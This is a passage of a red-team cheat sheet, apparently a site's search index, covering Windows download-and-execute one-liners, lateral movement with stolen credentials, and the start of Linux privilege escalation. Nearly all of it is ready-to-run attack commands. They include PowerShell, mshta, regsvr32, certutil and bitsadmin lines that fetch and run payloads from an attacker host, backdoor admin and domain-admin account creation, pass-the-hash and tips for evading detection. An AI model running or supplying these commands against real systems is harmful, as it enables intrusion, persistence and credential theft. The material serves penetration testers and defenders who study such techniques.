with remote - RedXORBlueJuly 18, 2018</li> <li>One thousand and one ways to copy your shellcode to memory (VBA Macros) - X-C3LL - Feb 18, 2021</li> <li>Running macros via ActiveX controls - greyhathacker - September 29, 2016</li> <li>Anti-Analysis Techniques Used in Excel 4.0 Macros - 24 March 2021 - @Jacob_Pimental</li> <li>So you think you can block Macros? - Pieter Ceelen - April 25, 2023</li> </ul>"},{"location":"redteam/access/windows-download-execute/","title":"Windows - Download and execute methods","text":""},{"location":"redteam/access/windows-download-execute/#downloaded-files-location","title":"Downloaded files location","text":"<ul> <li>C:\\Users\\\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\ <li>C:\\Users\\\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\ <li>C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Temp\\TfsStore\\Tfs_DAV</li>"},{"location":"redteam/access/windows-download-execute/#powershell","title":"Powershell","text":"<p>From an HTTP server</p> <pre><code>powershell -exec bypass -c \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex\"\n\n# Download only\n(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/PowerUp.ps1\", \"C:\\Windows\\Temp\\PowerUp.ps1\")\nInvoke-WebRequest \"http://10.10.10.10/binary.exe\" -OutFile \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\binary.exe\"\n\n# Download and run Rubeus, with arguments\n$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/Rubeus.exe')\n$assem = [System.Reflection.Assembly]::Load($data)\n[Rubeus.Program]::Main(\"s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt\".Split())\n\n# Execute a specific method from an assembly \n$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/lib.dll')\n$assem = [System.Reflection.Assembly]::Load($data)\n$class = $assem.GetType(\"ClassLibrary1.Class1\")\n$method = $class.GetMethod(\"runner\")\n$method.Invoke(0, $null)\n</code></pre> <p>From a Webdav server</p> <pre><code>powershell -exec bypass -f \\\\webdavserver\\folder\\payload.ps1\n</code></pre>"},{"location":"redteam/access/windows-download-execute/#cmd","title":"Cmd","text":"<pre><code>cmd.exe /k &lt; \\\\webdavserver\\folder\\batchfile.txt\n</code></pre>"},{"location":"redteam/access/windows-download-execute/#cscript-wscript","title":"Cscript / Wscript","text":"<pre><code>cscript //E:jscript \\\\webdavserver\\folder\\payload.txt\n</code></pre>"},{"location":"redteam/access/windows-download-execute/#mshta","title":"Mshta","text":"<pre><code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:http://webserver/payload.sct\"\")\"))\n</code></pre> <pre><code>mshta http://webserver/payload.hta\n</code></pre> <pre><code>mshta \\\\webdavserver\\folder\\payload.hta\n</code></pre>"},{"location":"redteam/access/windows-download-execute/#rundll32","title":"Rundll32","text":"<pre><code>rundll32 \\\\webdavserver\\folder\\payload.dll,entrypoint\n</code></pre> <pre><code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";o=GetObject(\"script:http://webserver/payload.sct\");window.close();\n</code></pre>"},{"location":"redteam/access/windows-download-execute/#regasm-regsvc-subtee","title":"Regasm / Regsvc @subTee","text":"<pre><code>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe /u \\\\webdavserver\\folder\\payload.dll\n</code></pre>"},{"location":"redteam/access/windows-download-execute/#regsvr32-subtee","title":"Regsvr32 @subTee","text":"<pre><code>regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll\n</code></pre> <pre><code>regsvr32 /u /n /s /i:\\\\webdavserver\\folder\\payload.sct scrobj.dll\n</code></pre>"},{"location":"redteam/access/windows-download-execute/#odbcconf","title":"Odbcconf","text":"<pre><code>odbcconf /s /a {regsvr \\\\webdavserver\\folder\\payload_dll.txt}\n</code></pre>"},{"location":"redteam/access/windows-download-execute/#msbuild","title":"Msbuild","text":"<pre><code>cmd /V /c \"set MB=\"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe\" &amp; !MB! /noautoresponse /preprocess \\\\webdavserver\\folder\\payload.xml &gt; payload.xml &amp; !MB! payload.xml\"\n</code></pre>"},{"location":"redteam/access/windows-download-execute/#certutil","title":"Certutil","text":"<pre><code>certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.dll &amp; C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil /logfile= /LogToConsole=false /u payload.dll\n</code></pre> <pre><code>certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.exe &amp; payload.exe\n</code></pre>"},{"location":"redteam/access/windows-download-execute/#bitsadmin","title":"Bitsadmin","text":"<pre><code>bitsadmin /transfer mydownloadjob /download /priority normal http://&lt;attackerIP&gt;/xyz.exe C:\\\\Users\\\\%USERNAME%\\\\AppData\\\\local\\\\temp\\\\xyz.exe\n</code></pre>"},{"location":"redteam/access/windows-download-execute/#references","title":"References","text":"<ul> <li>arno0x0x - Windows oneliners to download remote payload and execute arbitrary code</li> </ul>"},{"location":"redteam/access/windows-using-credentials/","title":"Windows - Using credentials","text":""},{"location":"redteam/access/windows-using-credentials/#summary","title":"Summary","text":"<ul> <li>Get credentials<ul> <li>Create your credential</li> <li>Guest Credential</li> <li>Retail Credential</li> <li>Sandbox Credential</li> </ul> </li> <li>Crackmapexec</li> <li> <p>Impacket</p> <ul> <li>PSExec</li> <li>WMIExec</li> <li>SMBExec</li> </ul> </li> <li> <p>RDP Remote Desktop Protocol</p> </li> <li>Powershell Remoting Protocol<ul> <li>Powershell Credentials</li> <li>Powershell PSSESSION</li> <li>Powershell Secure String</li> </ul> </li> <li>SSH Protocol</li> <li>WinRM Protocol</li> <li> <p>WMI Protocol</p> </li> <li> <p>Other methods</p> <ul> <li>PsExec - Sysinternal</li> <li>Mount a remote share</li> <li>Run as another user</li> </ul> </li> </ul>"},{"location":"redteam/access/windows-using-credentials/#get-credentials","title":"Get credentials","text":""},{"location":"redteam/access/windows-using-credentials/#create-your-credential","title":"Create your credential","text":"<pre><code>net user hacker Hcker_12345678* /add /Y\nnet localgroup administrators hacker /add\nnet localgroup \"Remote Desktop Users\" hacker /add # RDP access\nnet localgroup \"Backup Operators\" hacker /add # Full access to files\nnet group \"Domain Admins\" hacker /add /domain\n\n# enable a domain user account\nnet user hacker /ACTIVE:YES /domain\n\n# prevent users from changing their password\nnet user username /Passwordchg:No\n\n# prevent the password to expire\nnet user hacker /Expires:Never\n\n# create a machine account (not shown in net users)\nnet user /add evilbob$ evilpassword\n\n# homoglyph A\u0501m\u0456nistrat\u03bfr (different of Administrator)\nA\u0501m\u0456nistrat\u03bfr\n</code></pre> <p>Some info about your user</p> <pre><code>net user /dom\nnet user /domain\n</code></pre>"},{"location":"redteam/access/windows-using-credentials/#guest-credential","title":"Guest Credential","text":"<p>By default every Windows machine comes with a Guest account, its default password is empty.</p> <pre><code>Username: Guest\nPassword: [EMPTY]\nNT Hash: 31d6cfe0d16ae931b73c59d7e0c089c0\n</code></pre>"},{"location":"redteam/access/windows-using-credentials/#retail-credential","title":"Retail Credential","text":"<p>Retail Credential @m8urnett on Twitter</p> <p>when you run Windows in retail demo mode, it creates a user named Darrin DeYoung and an admin RetailAdmin</p> <pre><code>Username: RetailAdmin\nPassword: trs10\n</code></pre>"},{"location":"redteam/access/windows-using-credentials/#sandbox-credential","title":"Sandbox Credential","text":"<p>WDAGUtilityAccount - @never_released on Twitter</p> <p>Starting with Windows 10 version 1709 (Fall Creators Update), it is part of Windows Defender Application Guard</p> <pre><code>\\\\windowssandbox\nUsername: wdagutilityaccount\nPassword: pw123\n</code></pre>"},{"location":"redteam/access/windows-using-credentials/#crackmapexec","title":"Crackmapexec","text":"<p>Using mpgn/CrackMapExec</p> <ul> <li>CrackMapExec supports many protocols     <pre><code>crackmapexec ldap 192.168.1.100 -u Administrator -H \":31d6cfe0d16ae931b73c59d7e0c089c0\" \ncrackmapexec mssql 192.168.1.100 -u Administrator -H \":31d6cfe0d16ae931b73c59d7e0c089c0\"\ncrackmapexec rdp 192.168.1.100 -u Administrator -H \":31d6cfe0d16ae931b73c59d7e0c089c0\" \ncrackmapexec smb 192.168.1.100 -u Administrator -H \":31d6cfe0d16ae931b73c59d7e0c089c0\"\ncrackmapexec winrm 192.168.1.100 -u Administrator -H \":31d6cfe0d16ae931b73c59d7e0c089c0\"\n</code></pre></li> <li>CrackMapExec works with password, NT hash and Kerberos authentication     <pre><code>crackmapexec smb 192.168.1.100 -u Administrator -p \"Password123?\" # Password\ncrackmapexec smb 192.168.1.100 -u Administrator -H \":31d6cfe0d16ae931b73c59d7e0c089c0\" # NT Hash\nexport KRB5CCNAME=/tmp/kerberos/admin.ccache; crackmapexec smb 192.168.1.100 -u admin --use-kcache # Kerberos\n</code></pre></li> </ul>"},{"location":"redteam/access/windows-using-credentials/#impacket","title":"Impacket","text":"<p>From fortra/impacket ( renamed to impacket-xxxxx in Kali)   <code>get</code> / <code>put</code> for wmiexec, psexec, smbexec, and dcomexec are changing to <code>lget</code> and <code>lput</code>.    French characters might not be correctly displayed on your output, use <code>-codec ibm850</code> to fix this.   By default, Impacket's scripts are stored in the examples folder: <code>impacket/examples/psexec.py</code>. </p> <p>All Impacket's *exec scripts are not equal, they will target services hosted on multiples ports.  The following table summarize the port used by each scripts.</p> Method Port Used Admin Required psexec.py tcp/445 Yes smbexec.py tcp/445 No atexec.py tcp/445 No dcomexec.py tcp/135, tcp/445, tcp/49751 (DCOM) No wmiexec.py tcp/135, tcp/445, tcp/50911 (Winmgmt) Yes <ul> <li><code>psexec</code>: equivalent of Windows PSEXEC using RemComSvc binary.     <pre><code>psexec.py DOMAIN/username:password@10.10.10.10\n</code></pre></li> <li><code>smbexec</code>: a similar approach to PSEXEC w/o using RemComSvc     <pre><code>smbexec.py DOMAIN/username:password@10.10.10.10\n</code></pre></li> <li><code>atexec</code>: executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.     <pre><code>atexec.py DOMAIN/username:password@10.10.10.10\n</code></pre></li> <li><code>dcomexec</code>: a semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints     <pre><code>dcomexec.py DOMAIN/username:password@10.10.10.10\n</code></pre></li> <li><code>wmiexec</code>: a semi-interactive shell, used through Windows Management Instrumentation. First it uses ports tcp/135 and tcp/445, and ultimately it communicates with the Winmgmt Windows service over dynamically allocated high port such as tcp/50911.     <pre><code>wmiexec.py DOMAIN/username:password@10.10.10.10\nwmiexec.py DOMAIN/username@10.10.10.10 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\n</code></pre></li> </ul> <p>To allow Non-RID 500 local admin accounts performing Wmi or PsExec, execute:  <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /f /d 1</code> To prevent RID 500 from being able to WmiExec or PsExec, execute: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v FilterAdministratorToken /t REG_DWORD /f /d 1</code></p>"},{"location":"redteam/access/windows-using-credentials/#psexec","title":"PSExec","text":"<p>Instead of uploading <code>psexeccsv</code> service binary, it uploads to <code>ADMIN$</code> a service binary with an arbitrary name. PSExec default kavika13/RemCom binary is 10 years old, you might want to rebuild it and obfuscate it to reduce detections (snovvcrash/RemComObf.sh)</p> <p>Use a custom binary and service name with : <code>psexec.py Administrator:Password123@IP -service-name customservicename -remote-binary-name custombin.exe</code> </p> <p>Also a custom file can be specified with the parameter : <code>-file /tmp/RemComSvcCustom.exe</code>.   You need to update the pipe name to match \"Custom_communication\" in the line 163     </p> <pre><code>162    tid = s.connectTree('IPC$')\n163    fid_main = self.openPipe(s,tid,r'\\RemCom_communicaton',0x12019f)\n</code></pre> <p>Alternatively you can use the fork ThePorgs/impacket.</p>"},{"location":"redteam/access/windows-using-credentials/#wmiexec","title":"WMIExec","text":"<p>Use a non default share <code>-share SHARE</code> to write the output to reduce the detection.  By default this command is executed : <code>cmd.exe /Q /c cd 1&gt; \\\\127.0.0.1\\ADMIN$\\__RANDOM 2&gt;&amp;1</code></p>"},{"location":"redteam/access/windows-using-credentials/#smbexec","title":"SMBExec","text":"<p>It creates a service with the name <code>BTOBTO</code> (smbexec.py#L59) and transfers commands from the attacker in a bat file in <code>%TEMP/execute.bat</code> (smbexec.py#L56).</p> <pre><code>OUTPUT_FILENAME = '__output'\nBATCH_FILENAME  = 'execute.bat'\nSMBSERVER_DIR   = '__tmp'\nDUMMY_SHARE     = 'TMP'\nSERVICE_NAME    = 'BTOBTO'\n</code></pre> <p>It will create a new service every time we execute a command. It will also generate an Event 7045.</p> <p>By default this command is executed: <code>%COMSPEC% /Q /c echo dir &gt; \\\\127.0.0.1\\C$\\__output 2&gt;&amp;1 &gt; %TEMP%\\execute.bat &amp; %COMSPEC% /Q /c %TEMP%\\execute.bat &amp; del %TEMP%\\execute.bat</code>, where <code>%COMSPEC%</code> points to <code>C:\\WINDOWS\\system32\\cmd.exe</code>.</p> <pre><code>class RemoteShell(cmd.Cmd):\n    def __init__(self, share, rpc, mode, serviceName, shell_type):\n        cmd.Cmd.__init__(self)\n        self.__share = share\n        self.__mode = mode\n        self.__output = '\\\\\\\\127.0.0.1\\\\' + self.__share + '\\\\' + OUTPUT_FILENAME\n        self.__batchFile = '%TEMP%\\\\' + BATCH_FILENAME\n        self.__outputBuffer = b''\n        self.__command = ''\n        self.__shell = '%COMSPEC% /Q /c '\n        self.__shell_type = shell_type\n        self.__pwsh = 'powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc '\n        self.__serviceName = serviceName\n</code></pre>"},{"location":"redteam/access/windows-using-credentials/#rdp-remote-desktop-protocol","title":"RDP Remote Desktop Protocol","text":"<p> NOTE: You may need to enable RDP and disable NLA and fix CredSSP errors.</p> <pre><code># Enable RDP\nPS C:\\&gt; reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0x00000000 /f\nPS C:\\&gt; netsh firewall set service remoteadmin enable\nPS C:\\&gt; netsh firewall set service remotedesktop enable\n# Alternative\nC:\\&gt; psexec \\\\machinename reg add \"hklm\\system\\currentcontrolset\\control\\terminal server\" /f /v fDenyTSConnections /t REG_DWORD /d 0\nroot@payload$ crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable\n\n# Fix CredSSP errors\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f\n\n# Disable NLA\nPS &gt; (Get-WmiObject -class \"Win32_TSGeneralSetting\" -Namespace root\\cimv2\\terminalservices -ComputerName \"PC01\" -Filter \"TerminalName='RDP-tcp'\").UserAuthenticationRequired\nPS &gt; (Get-WmiObject -class \"Win32_TSGeneralSetting\" -Namespace root\\cimv2\\terminalservices -ComputerName \"PC01\" -Filter \"TerminalName='RDP-tcp'\").SetUserAuthenticationRequired(0)\n</code></pre> <p>Abuse RDP protocol to execute commands remotely with the following commands;</p> <ul> <li><code>rdesktop</code> <pre><code>root@payload$ rdesktop -d DOMAIN -u username -p password 10.10.10.10 -g 70 -r disk:share=/home/user/myshare\nroot@payload$ rdesktop -u username -p password -g 70% -r disk:share=/tmp/myshare 10.10.10.10\n# -g : the screen will take up 70% of your actual screen size\n# -r disk:share : sharing a local folder during a remote desktop session \n</code></pre></li> <li><code>freerdp</code> <pre><code>root@payload$ xfreerdp /v:10.0.0.1 /u:'Username' /p:'Password123!' +clipboard /cert-ignore /size:1366x768 /smart-sizing\nroot@payload$ xfreerdp /v:10.0.0.1 /u:username # password will be asked\n\n# pass the hash using Restricted Admin, need an admin account not in the \"Remote Desktop Users\" group.\n# pass the hash works for Server 2012 R2 / Win 8.1+\n# require freerdp2-x11 freerdp2-shadow-x11 packages instead of freerdp-x11\nroot@payload$ xfreerdp /v:10.0.0.1 /u:username /d:domain /pth:88a405e17c0aa5debbc9b5679753939d  \n</code></pre></li> <li>SharpRDP <pre><code>PS C:\\&gt; SharpRDP.exe computername=target.domain command=\"C:\\Temp\\file.exe\" username=domain\\user password=password\n</code></pre></li> </ul>"},{"location":"redteam/access/windows-using-credentials/#powershell-remoting-protocol","title":"Powershell Remoting Protocol","text":""},{"location":"redteam/access/windows-using-credentials/#powershell-credentials","title":"Powershell Credentials","text":"<pre><code>PS&gt; $pass = ConvertTo-SecureString 'supersecurepassword' -AsPlainText -Force\nPS&gt; $cred = New-Object System.Management.Automation.PSCredential ('DOMAIN\\Username', $pass)\n</code></pre>"},{"location":"redteam/access/windows-using-credentials/#powershell-pssession","title":"Powershell PSSESSION","text":"<ul> <li> <p>Enable PSRemoting on the host     <pre><code>Enable-PSRemoting -Force\nnet start winrm  \n\n# Add the machine to the trusted hosts\nSet-Item wsman:\\localhost\\client\\trustedhosts *\nSet-Item WSMan:\\localhost\\Client\\TrustedHosts -Value \"10.10.10.10\"\n</code></pre></p> </li> <li> <p>Execute a single command     <pre><code>PS&gt; Invoke-Command -ComputerName DC -Credential $cred -ScriptBlock { whoami }\nPS&gt; Invoke-Command -computername DC01,CLIENT1 -scriptBlock { Get-Service }\nPS&gt; Invoke-Command -computername DC01,CLIENT1 -filePath c:\\Scripts\\Task.ps1\n</code></pre></p> </li> <li> <p>Interact with a PS Session     <pre><code>PS&gt; Enter-PSSession -computerName DC01\n[DC01]: PS&gt;\n\n# one-to-one execute scripts and commands\nPS&gt; $Session = New-PSSession -ComputerName CLIENT1\nPS&gt; Invoke-Command -Session $Session -scriptBlock { $test = 1 }\nPS&gt; Invoke-Command -Session $Session -scriptBlock { $test }\n1\n</code></pre></p> </li> </ul>"},{"location":"redteam/access/windows-using-credentials/#powershell-secure-string","title":"Powershell Secure String","text":"<pre><code>$aesKey = (49, 222, 253, 86, 26, 137, 92, 43, 29, 200, 17, 203, 88, 97, 39, 38, 60, 119, 46, 44, 219, 179, 13, 194, 191, 199, 78, 10, 4, 40, 87, 159)\n$secureObject = ConvertTo-SecureString -String \"76492d11167[SNIP]MwA4AGEAYwA1AGMAZgA=\" -Key $aesKey\n$decrypted = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureObject)\n$decrypted = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($decrypted)\n$decrypted\n</code></pre>"},{"location":"redteam/access/windows-using-credentials/#winrm-protocol","title":"WinRM Protocol","text":"<p>Requirements: * Port 5985 or 5986 open. * Default endpoint is /wsman</p> <p>If WinRM is disabled on the system you can enable it using: <code>winrm quickconfig</code></p> <p>The easiest way to interact over WinRM on Linux is with Hackplayers/evil-winrm <pre><code>evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM]\nevil-winrm -i 10.0.0.20 -u username -H HASH\nevil-winrm -i 10.0.0.20 -u username -p password -r domain.local\n\n*Evil-WinRM* PS &gt; Bypass-4MSI\n*Evil-WinRM* PS &gt; IEX([Net.Webclient]::new().DownloadString(\"http://127.0.0.1/PowerView.ps1\"))\n</code></pre></p>"},{"location":"redteam/access/windows-using-credentials/#wmi-protocol","title":"WMI Protocol","text":"<pre><code>PS C:\\&gt; wmic /node:target.domain /user:domain\\user /password:password process call create \"C:\\Windows\\System32\\calc.exe\u201d\n</code></pre>"},{"location":"redteam/access/windows-using-credentials/#ssh-protocol","title":"SSH Protocol","text":"<p> You cannot pass the hash to SSH, but you can connect with a Kerberos ticket (Which you can get by passing the hash!)</p> <pre><code>cp user.ccache /tmp/krb5cc_1045\nssh -o GSSAPIAuthentication=yes user@domain.local -vv\n</code></pre>"},{"location":"redteam/access/windows-using-credentials/#other-methods","title":"Other methods","text":""},{"location":"redteam/access/windows-using-credentials/#psexec-sysinternal","title":"PsExec - Sysinternal","text":"<p>From Windows - Sysinternal</p> <pre><code>PS C:\\&gt; PsExec.exe  \\\\srv01.domain.local -u DOMAIN\\username -p password cmd.exe\n\n# switch admin user to NT Authority/System\nPS C:\\&gt; PsExec.exe  \\\\srv01.domain.local -u DOMAIN\\username -p password cmd.exe -s \n</code></pre>"},{"location":"redteam/access/windows-using-credentials/#mount-a-remote-share","title":"Mount a remote share","text":"<pre><code>PS C:\\&gt; net use \\\\srv01.domain.local /user:DOMAIN\\username password C$\n</code></pre>"},{"location":"redteam/access/windows-using-credentials/#runas-as-another-user","title":"Runas as another user","text":"<p>Runas is a command-line tool that is built into Windows Vista. Allows a user to run specific tools and programs with different permissions than the user's current logon provides.</p> <pre><code>PS C:\\&gt; runas /netonly /user:DOMAIN\\username \"cmd.exe\"\nPS C:\\&gt; runas /noprofil /netonly /user:DOMAIN\\username cmd.exe\n</code></pre>"},{"location":"redteam/access/windows-using-credentials/#references","title":"References","text":"<ul> <li>Ropnop - Using credentials to own Windows boxes</li> <li>Ropnop - Using credentials to own Windows boxes Part 2</li> <li>Gaining Domain Admin from Outside Active Directory</li> <li>Impacket Remote code execution on Windows from Linux by Vry4n_ - Jun 20, 2021</li> <li>Impacket Exec Commands Cheat Sheet - 13cubed</li> <li>SMB protocol cheatsheet - aas-s3curity</li> <li>Windows Lateral Movement with smb, psexec and alternatives - nv2lt</li> <li>PsExec.exe IOCs and Detection - Threatexpress</li> <li>A Dive on SMBEXEC - dmcxblue - 8th Feb 2021</li> </ul>"},{"location":"redteam/escalation/linux-privilege-escalation/","title":"Linux - Privilege Escalation","text":""},{"location":"redteam/escalation/linux-privilege-escalation/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Checklist</li> <li>Looting for passwords<ul> <li>Files containing passwords</li> <li>Old passwords in /etc/security/opasswd</li> <li>Last edited files</li> <li>In memory passwords</li> <li>Find sensitive files</li> </ul> </li> <li>SSH Key<ul> <li>Sensitive files</li> <li>SSH Key Predictable PRNG (Authorized_Keys) Process</li> </ul> </li> <li>Scheduled tasks<ul> <li>Cron jobs</li> <li>Systemd timers</li> </ul> </li> <li>SUID<ul> <li>Find SUID binaries</li> <li>Create a SUID binary</li> </ul> </li> <li>Capabilities<ul> <li>List capabilities of binaries</li> <li>Edit capabilities</li> <li>Interesting capabilities</li> </ul> </li> <li>SUDO<ul> <li>NOPASSWD</li> <li>LD_PRELOAD and NOPASSWD</li> <li>Doas</li> <li>sudo_inject</li> <li>CVE-2019-14287</li> </ul> </li> <li>GTFOBins</li> <li>Wildcard</li> <li>Writable files<ul> <li>Writable /etc/passwd</li> <li>Writable /etc/sudoers</li> </ul> </li> <li>NFS Root Squashing</li> <li>Shared Library<ul> <li>ldconfig</li> <li>RPATH</li> </ul> </li> <li>Groups<ul> <li>Docker</li> <li>LXC/LXD</li> </ul> </li> <li>Hijack TMUX session</li> <li>Kernel Exploits<ul> <li>CVE-2022-0847 (DirtyPipe) </li> <li>CVE-2016-5195 (DirtyCow)</li> <li>CVE-2010-3904 (RDS)</li> <li>CVE-2010-4258 (Full Nelson)</li> <li>CVE-2012-0056 (Mempodipper)</li> </ul> </li> </ul>"},{"location":"redteam/escalation/linux-privilege-escalation/#tools","title":"Tools","text":"<p>There are many scripts that you can execute on a linux machine which automatically enumerate sytem information, processes, and files to locate privilege escalation vectors. Here are a few:</p> <ul> <li> <p>LinPEAS - Linux Privilege Escalation Awesome Script</p> <pre><code>wget \"https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh\" -O linpeas.sh\ncurl \"https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh\" -o linpeas.sh\n./linpeas.sh -a #all checks - deeper system enumeration, but it takes longer to complete.\n./linpeas.sh -s #superfast &amp; stealth - This will bypass some time consuming checks. In stealth mode Nothing will be written to the disk.\n./linpeas.sh -P #Password - Pass a password that will be used with sudo -l and bruteforcing other users\n</code></pre> </li> <li> <p>LinuxSmartEnumeration - Linux enumeration tools for pentesting and CTFs</p> <pre><code>wget \"https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh\" -O lse.sh\ncurl \"https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh\" -o lse.sh\n./lse.sh -l1 # shows interesting information that should help you to privesc\n./lse.sh -l2 # dump all the information it gathers about the system\n</code></pre> </li> <li> <p>LinEnum - Scripted Local Linux Enumeration &amp; Privilege Escalation Checks</p> <pre><code>./LinEnum.sh -s -k keyword -r report -e /tmp/ -t\n</code></pre> </li> <li> <p>BeRoot - Privilege Escalation Project - Windows / Linux / Mac</p> </li> <li>linuxprivchecker.py - a Linux Privilege Escalation Check Script</li> <li>unix-privesc-check - Automatically exported from code.google.com/p/unix-privesc-check</li> <li>Privilege Escalation through sudo - Linux</li> </ul>"},{"location":"redteam/escalation/linux-privilege-escalation/#checklists","title":"Checklists","text":"<ul> <li>Kernel and distribution release details</li> <li>System Information:</li> <li>Hostname</li> <li>Networking details:</li> <li>Current IP</li> <li>Default route details</li> <li>DNS server information</li> <li>User Information:</li> <li>Current user details</li> <li>Last logged on users</li> <li>Shows users logged onto the host</li> <li>List all users including uid/gid information</li> <li>List root accounts</li> <li>Extracts password policies and hash storage method information</li> <li>Checks umask value</li> <li>Checks if password hashes are stored in /etc/passwd</li> <li>Extract full details for 'default' uid's such as 0, 1000, 1001 etc</li> <li>Attempt to read restricted files i.e. /etc/shadow</li> <li>List current users history files (i.e .bash_history, .nano_history, .mysql_history , etc.)</li> <li>Basic SSH checks</li> <li>Privileged access:</li> <li>Which users have recently used sudo</li> <li>Determine if /etc/sudoers is accessible</li> <li>Determine if the current user has Sudo access without a password</li> <li>Are known 'good' breakout binaries available via Sudo (i.e. nmap, vim etc.)</li> <li>Is root's home directory accessible</li> <li>List permissions for /home/</li> <li>Environmental:</li> <li>Display current $PATH</li> <li>Displays env information</li> <li>Jobs/Tasks:</li> <li>List all cron jobs</li> <li>Locate all world-writable cron jobs</li> <li>Locate cron jobs owned by other users of the system</li> <li>List the active and inactive systemd timers</li> <li>Services:</li> <li>List network connections (TCP &amp; UDP)</li> <li>List running processes</li> <li>Lookup and list process binaries and associated permissions</li> <li>List inetd.conf/xined.conf contents and associated binary file permissions</li> <li>List init.d binary permissions</li> <li>Version Information (of the following):</li> <li>Sudo</li> <li>MYSQL</li> <li>Postgres</li> <li>Apache<ul> <li>Checks user config</li> <li>Shows enabled modules</li> <li>Checks for htpasswd files</li> <li>View www directories</li> </ul> </li> <li>Default/Weak Credentials:</li> <li>Checks for default/weak Postgres accounts</li> <li>Checks for default/weak MYSQL accounts</li> <li>Searches:</li> <li>Locate all SUID/GUID files</li> <li>Locate all world-writable SUID/GUID files</li> <li>Locate all SUID/GUID files owned by root</li> <li>Locate 'interesting' SUID/GUID files (i.e. nmap, vim etc)</li> <li>Locate files with POSIX capabilities</li> <li>List all world-writable files</li> <li>Find/list all accessible *.plan files and display contents</li> <li>Find/list all accessible *.rhosts files and display contents</li> <li>Show NFS server details</li> <li>Locate .conf and .log files containing keyword supplied at script runtime</li> <li>List all *.conf files located in /etc</li> <li>Locate mail</li> <li>Platform/software specific tests:</li> <li>Checks to determine if we're in a Docker container</li> <li>Checks to see if the host has Docker installed</li> <li>Checks to determine if we're in an LXC container</li> </ul>"},{"location":"redteam/escalation/linux-privilege-escalation/#looting-for-passwords","title":"Looting for passwords","text":""},{"location":"redteam/escalation/linux-privilege-escalation/#files-containing-passwords","title":"Files containing passwords","text":"<pre><code>grep --color=auto -rnw '/' -ie \"PASSWORD\" --color=always 2&gt; /dev/null\nfind . -type f -exec grep -i -I \"PASSWORD\" {} /dev/null \\;\n</code></pre>"},{"location":"redteam/escalation/linux-privilege-escalation/#old-passwords-in-etcsecurityopasswd","title":"Old passwords in /etc/security/opasswd","text":"<p>The <code>/etc/security/opasswd</code> file is used also by pam_cracklib to keep the history of old passwords so that the user will not reuse them.</p> <p> Treat your opasswd file like your /etc/shadow file because it will end up containing user password hashes </p>"},{"location":"redteam/escalation/linux-privilege-escalation/#last-edited-files","title":"Last edited files","text":"<p>Files that were edited in the last 10 minutes</p> <pre><code>find / -mmin -10 2&gt;/dev/null | grep -Ev \"^/proc\"\n</code></pre>"},{"location":"redteam/escalation/linux-privilege-escalation/#in-memory-passwords","title":"In memory passwords","text":"<pre><code>strings /dev/mem -n10 | grep -i PASS\n</code></pre>"},{"location":"redteam/escalation/linux-privilege-escalation/#find-sensitive-files","title":"Find sensitive files","text":"<pre><code>$ locate password | more           \n/boot/grub/i386-pc/password.mod\n/etc/pam.d/common-password\n/etc/pam.d/gdm-password\n/etc/pam.d/gdm-password.original\n/lib/live/config/0031-root-password\n...\n</code></pre>"},{"location":"redteam/escalation/linux-privilege-escalation/#ssh-key","title":"SSH Key","text":""},{"location":"redteam/escalation/linux-privilege-escalation/#sensitive-files","title":"Sensitive files","text":"<pre><code>find / -name authorized_keys 2&gt; /dev/null\nfind / -name id_rsa 2&gt; /dev/null\n...\n</code></pre>"},{"location":"redteam/escalation/linux-privilege-escalation/#ssh-key-predictable-prng-authorized_keys-process","title":"SSH Key Predictable PRNG (Authorized_Keys) Process","text":"<p>This module describes how to attempt to use an obtained authorized_keys file on a host system.</p> <p>Needed : SSH-DSS String from authorized_keys file</p> 